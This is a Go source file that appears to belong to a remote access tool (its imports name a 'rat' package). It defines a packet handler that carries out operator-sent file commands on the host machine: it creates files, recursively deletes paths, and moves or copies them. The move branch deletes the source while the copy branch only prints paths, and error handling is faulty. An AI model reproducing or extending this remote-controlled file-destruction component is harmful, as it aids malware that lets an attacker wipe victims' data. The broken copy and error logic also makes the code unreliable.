package main

import (
	"fmt"
	"os"
	"path/filepath"
	"rat/common"
	"strings"
)

type FilePacket struct {
	File        string `receive`
	Task        int    `receive`
	Destination string `receive`
}

func (packet FilePacket) Header() common.PacketHeader {
	return common.FileHeader
}

func (packet FilePacket) OnReceive() error {
	file := packet.File
	task := common.FileTask(packet.Task)

	switch task {
	case common.Touch:
		f, ferr := os.Create(file)
		if ferr != nil {
			f.Close()
		}
	case common.Unlink:
		os.RemoveAll(file)
	case common.Move:
		defer os.RemoveAll(file)
		fallthrough
	case common.Copy:
		dest := packet.Destination
		stat, _ := os.Stat(file)

		if stat.IsDir() {
			filepath.Walk(file, func(filepath string, fileInfo os.FileInfo, err error) error {
				newpath := strings.Replace(filepath, file, dest, -1)
				fmt.Println("Old:", filepath, "new:", newpath)
				return nil
			})
		} else {
			fmt.Println(filepath.Join(dest, filepath.Base(file)))
		}
	}

	return nil
}
